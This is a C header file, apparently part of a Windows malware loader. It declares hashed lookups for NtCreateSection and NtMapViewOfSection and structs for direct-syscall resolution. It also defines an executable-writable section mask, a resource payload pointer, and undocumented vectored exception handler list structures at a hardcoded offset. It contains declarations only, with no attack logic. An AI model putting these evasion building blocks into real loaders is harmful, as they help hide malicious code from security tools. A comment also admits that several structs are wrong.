#pragma once
#include <Windows.h>
#include <winternl.h>

#define H_NCS   ( 0xb80f7b50 )
#define H_NMVOS ( 0xd6649bca )

#define VEH_LIST_OFFSET_WIN10 0x1813F0

#define SECTION_RWX (SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE)
#define ROL(x, y) ((unsigned long long)(x) << (y) | (unsigned long long)(x) >> 64 - (y))

typedef struct _PE_STUFF {
    PDWORD      pdwArrayOfAddresses;
    PDWORD      pdwArrayOfNames;
    PWORD       pwArrayOfOrdinals;
    DWORD       dwNumberOfNames;
    ULONG_PTR   uNtdll;
    PBYTE       pRsrcPayload;
    DWORD       dwRsrc;
}PE_STUFF, * PPE_STUFF;

typedef struct _NT_SYSCALL {
    DWORD   dwSSN;
    PVOID   pSyscallAddress;
}NT_SYSCALL, * PNT_SYSCALL;

typedef struct _NTAPI_FUNC {
    NT_SYSCALL  NtCreateSection;
    NT_SYSCALL  NtMapViewOfSection;
}NTAPI_FUNC, * PNTAPI_FUNC;

//-----------------MOST-OF-THESE-STRUCTS-ARE-WRONG------------------
//---------------BUT-THEY-WORK-FOR-US-AT-THE-MOMENT-----------------

typedef struct _VECTORED_HANDLER_ENTRY {
    struct _VECTORED_HANDLER_ENTRY* next;
    struct _VECTORED_HANDLER_ENTRY* previous;
    ULONG                           refs;
    PVECTORED_EXCEPTION_HANDLER     handler;
} VECTORED_HANDLER_ENTRY, PVECTORED_HANDLER_ENTRY;

typedef struct _VEH_HANDLER_ENTRY {
    LIST_ENTRY Entry;
    PVOID      VectoredHandler3;
    PVOID      VectoredHandler2;
    PVOID      VectoredHandler1;
} VEH_HANDLER_ENTRY, PVEH_HANDLER_ENTRY;

typedef struct _VECTORED_HANDLER_LIST {
    PVOID                   MutexException;
    VECTORED_HANDLER_ENTRY* FirstExceptionHandler;
    VECTORED_HANDLER_ENTRY* LastExceptionHandler;
    PVOID                   MutexContinue;
    VECTORED_HANDLER_ENTRY* FirstContinueHandler;
    VECTORED_HANDLER_ENTRY* LastContinueHandler;
} VECTORED_HANDLER_LIST, * PVECTORED_HANDLER_LIST;

//------------------------------------------------------------------

typedef NTSTATUS(NTAPI* fnNtCreateSection)(
    PHANDLE				SectionHandle,
    ACCESS_MASK			DesiredAccess,
    POBJECT_ATTRIBUTES	ObjectAttributes,
    PLARGE_INTEGER		MaximumSize,
    ULONG				SectionPageProtection,
    ULONG				AllocationAttributes,
    HANDLE				FileHandle
    );

typedef NTSTATUS(NTAPI* fnNtMapViewOfSection)(
    HANDLE				SectionHandle,
    HANDLE				ProcessHandle,
    PVOID*              BaseAddress,
    ULONG_PTR			ZeroBits,
    SIZE_T				CommitSize,
    PLARGE_INTEGER		SectionOffset,
    PSIZE_T				ViewSize,
    ULONG       		InheritDisposition,
    ULONG				AllocationType,
    ULONG				Win32Protect
    );
